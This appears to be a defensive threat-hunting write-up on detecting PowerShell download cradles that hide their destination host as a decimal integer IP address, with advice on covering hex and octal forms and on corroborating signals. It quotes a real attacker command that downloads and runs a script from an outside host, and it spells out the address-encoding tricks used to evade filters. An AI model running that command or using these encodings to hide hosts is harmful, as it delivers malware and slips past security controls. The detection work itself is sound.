# H380

The command the victims pasted was `irm 1614733393/12 | Out-File $env:temp\1777.ps1;& $env:temp\1777.ps1`.

There is no IP address in it. There is also no hostname. `1614733393` is the 32-bit integer whose dotted-quad form is `96.62.224[.]81`, and the Windows networking stack expands it transparently — the request goes exactly where a dotted address would have sent it.

Huntress states the consequence plainly: rules and URL filters looking for a dotted IP never see one. That single transformation steps around an entire family of controls at the same time. IPv4 regexes miss it. Dotted-quad indicator feeds miss it. URL filters with a literal-IP-host rule miss it. And an analyst skimming a command line for something that looks like an address sees a number that could be anything — a build ID, a timestamp, a ticket reference.

What makes this a good hunt rather than just a good trick is the benign population, which is essentially empty. Nobody writes a destination host as a bare decimal integer on purpose. It is harder to read, harder to maintain, unsupported by most tooling, and buys an administrator nothing at all. Integer-form addresses do exist legitimately — network libraries and subnet-arithmetic helpers convert to and from them constantly — but they do that *inside code*, not in a `powershell.exe -ExecutionPolicy Bypass` invocation. The context requirement separates the two for free.

There is a second artefact worth collecting, though it is an inference rather than something Huntress reported. Because the host is already an address, there is no name to resolve, so the script host connects to a public IP it never looked up. Sysmon records DNS queries per process, which makes that checkable. It is noisy on its own — proxies and IP-literal services do the same — so use it to corroborate the command-line leg, not to replace it.

Cover the other radixes while you are here. Decimal is the form Huntress observed, but hexadecimal (`0x603EE051`), dotted hex (`0x60.0x3E.0xE0.0x51`), dotted octal (`0140.076.0340.0121`) and mixed-radix forms all work the same way for the same reason, and a pattern written for only one of them has a short life. Anchor on the *host position* rather than on any long run of digits, or `http://10.1.1.5/12345` will generate hits forever.

This is deliberately not another ClickFix hunt. The social engineering, the Explorer-parent chokepoint and the cradle shapes are covered in [[H024]], [[H090]] and [[H277]]. What is new is one transformation applied to the destination, and it has nothing to do with how the command reached the user.

## Why

- **One transformation defeats several controls at once.** IPv4 regexes, dotted-quad indicator feeds, URL-filter literal-IP rules and human review all key on a format that is simply not present.
- **The benign population is close to zero, which makes a hit actionable immediately.** No administrator, installer or deployment system has a reason to write a host as a bare integer. This is a hunt where first sighting justifies escalation rather than tuning.
- **Legitimate integer addresses live in code, not in command lines.** Network libraries convert between forms internally. Requiring a download verb in the same command line separates the two without an allowlist.
- **The missing DNS query is a useful corroborating artefact.** A numeric host needs no resolution, so the process connects to an IP it never resolved. Per-process DNS logging makes that checkable, but proxies and IP-literal services produce the same pattern, so it confirms a command-line hit rather than standing alone.
- **Covering only decimal gives the detection a short shelf life.** Hexadecimal, dotted hex, octal and mixed-radix forms are equally valid to the resolver and equally invisible to a dotted-quad rule.
- **Anchoring on host position is what keeps precision high.** Any long digit run in a URL path will match a careless pattern, and the resulting noise is the usual reason this detection gets abandoned.
- **It is independent of the delivery mechanism entirely.** The Custom GPT lure is interesting and will be replaced. The host encoding applies to any cradle, from any front end, including ones that have nothing to do with ClickFix.
- **A numeric-named `.ps1` in the temp directory corroborates for free.** The observed names were `1777.ps1` and `6469.ps1`, and a purely numeric script filename in `%TEMP%` is a cheap second query with its own small benign population.
